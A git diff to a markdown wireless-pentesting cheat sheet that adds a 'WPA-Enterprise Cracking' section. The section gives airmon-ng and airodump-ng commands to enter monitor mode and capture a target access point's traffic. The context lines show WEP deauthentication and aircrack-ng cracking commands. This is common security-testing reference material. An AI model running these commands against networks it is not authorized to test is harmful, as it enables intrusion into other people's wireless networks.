@@ -6,6 +6,7 @@
   * [WEP Cracking (Clientless)](#wep-cracking-clientless)
   * [WEP Cracking (Connected Client)](#wep-cracking-connected-client)
   * [WEP Cracking (Connected Client [Other Method])](#wep-cracking-connected-client-other-method)
+  * [WPA-Enterprise Cracking](#wpa--enterprise-cracking)
 
 ## Info Gathering
 - Get MAC Address of wireless network card
@@ -142,5 +143,17 @@ aireplay-ng -0 1 -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon
 ```
 aircrack-ng <captured file (.cap)>
 ```
-
+## WPA-Enterprise Cracking
+1. Put the interface into monitor mode
+```
+airmon-ng start wlan0
+```
+2. Gain the information of the interface
+```
+airodump-ng wlan0mon
+```
+3. Capture the traffic and specify the Target AP
+```
+sudo airodump-ng -c <channel> --bssid <bssid of the AP> -w <output filename> wlan0mon
+```
 
